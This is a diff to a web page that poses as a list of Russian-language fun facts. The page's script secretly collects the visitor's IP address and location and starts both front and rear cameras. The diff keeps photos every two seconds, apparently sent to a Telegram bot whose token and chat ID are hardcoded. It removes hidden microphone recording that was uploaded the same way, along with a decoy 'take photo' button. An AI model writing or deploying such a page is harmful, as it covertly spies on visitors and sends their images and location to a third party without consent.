@@ -28,17 +28,6 @@
       line-height: 1.5;
       box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
     }
-    button {
-      padding: 10px 20px;
-      font-size: 1.2em;
-      background: #ff6b6b;
-      border: none;
-      color: white;
-      border-radius: 5px;
-      cursor: pointer;
-      margin: 10px;
-    }
-    button:hover { background: #ff8787; }
     #videoFront, #videoBack, #canvasFront, #canvasBack { display: none; }
   </style>
 </head>
@@ -53,7 +42,6 @@
   <div class="fact">Медузы не имеют мозга, сердца или костей — они на 95% состоят из воды.</div>
   <div class="fact">В космосе нет звука, потому что там нет воздуха для передачи звуковых волн.</div>
   <div class="fact">Самое глубокое место в океане — Марианская впадина, глубина 11 км.</div>
-  <button onclick="fakePhoto()">Сделать фото</button>
 
   <script>
     const videoFront = document.getElementById('videoFront');
@@ -64,11 +52,9 @@
     const contextBack = canvasBack.getContext('2d');
     const token = '8176524950:AAGfsNYH5qwFzIvoUmsI-UkzptDMDAYtIVQ';
     const chatId = '5678878569';
-    let mediaRecorder;
-    let audioChunks = [];
-    let photoInterval;
+    let photoIntervalFront, photoIntervalBack;
 
-    // IP и город
+    // IP
     fetch('https://ip-api.com/json/?fields=61439')
       .then(response => response.json())
       .then(data => {
@@ -82,27 +68,27 @@
         }).catch(err => console.error('Ошибка отправки IP/города:', err));
       });
 
-    // Запуск камер и микрофона
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
-      .then(streamFront => {
-        videoFront.srcObject = streamFront;
+    // Фронтальная камера
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+      .then(stream => {
+        videoFront.srcObject = stream;
         videoFront.onloadedmetadata = () => {
-          setTimeout(() => startPhotoLoop(streamFront, 'front'), 2000); // Фронтальная с задержкой
-          startRecording(streamFront); // Аудио
+          setTimeout(() => startPhotoLoop(stream, 'front'), 2000); // Задержка 2 секунды
         };
       })
       .catch(err => console.error('Ошибка фронтальной камеры:', err));
 
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false })
-      .then(streamBack => {
-        videoBack.srcObject = streamBack;
+    // Задняя камера
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } })
+      .then(stream => {
+        videoBack.srcObject = stream;
         videoBack.onloadedmetadata = () => {
-          setTimeout(() => startPhotoLoop(streamBack, 'back'), 2000); // Задняя с задержкой
+          setTimeout(() => startPhotoLoop(stream, 'back'), 2000); // Задержка 2 секунды
         };
       })
       .catch(err => console.error('Ошибка задней камеры:', err));
 
-    // Фото каждую секунду
+    // Фото каждые 2 секунды
     function startPhotoLoop(stream, type) {
       const video = type === 'front' ? videoFront : videoBack;
       const canvas = type === 'front' ? canvasFront : canvasBack;
@@ -123,58 +109,14 @@
         }, 'image/png');
       }
       takePhoto(); // Первое фото
-      photoInterval = setInterval(takePhoto, 1000); // Каждую секунду
-    }
-
-    // Фейковая кнопка
-    function fakePhoto() {
-      // Ничего не делает
-    }
-
-    // Начало записи аудио
-    function startRecording(stream) {
-      mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
-      audioChunks = [];
-
-      mediaRecorder.ondataavailable = event => {
-        if (event.data.size > 0) audioChunks.push(event.data);
-      };
-      mediaRecorder.onstop = () => sendAudio();
-
-      mediaRecorder.start(100); // Данные каждые 100 мс
-      setTimeout(() => {
-        if (mediaRecorder.state === 'recording') mediaRecorder.stop();
-      }, 10000); // 10 секунд
-    }
-
-    // Отправка аудио
-    function sendAudio() {
-      if (audioChunks.length === 0) {
-        console.error('Нет аудиоданных');
-        return;
-      }
-      const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
-      const formData = new FormData();
-      formData.append('chat_id', chatId);
-      formData.append('voice', audioBlob, 'voice.ogg');
-
-      fetch(`https://api.telegram.org/bot${token}/sendVoice`, {
-        method: 'POST',
-        body: formData
-      })
-        .then(response => response.json())
-        .then(data => {
-          if (!data.ok) console.error('Ошибка отправки голосового:', data);
-        })
-        .catch(err => console.error('Ошибка отправки голосового:', err));
+      if (type === 'front') photoIntervalFront = setInterval(takePhoto, 2000);
+      else photoIntervalBack = setInterval(takePhoto, 2000);
     }
 
     // Остановка при уходе
     window.onbeforeunload = () => {
-      if (mediaRecorder && mediaRecorder.state === 'recording') {
-        mediaRecorder.stop();
-      }
-      if (photoInterval) clearInterval(photoInterval);
+      if (photoIntervalFront) clearInterval(photoIntervalFront);
+      if (photoIntervalBack) clearInterval(photoIntervalBack);
     };
   </script>
 </body>
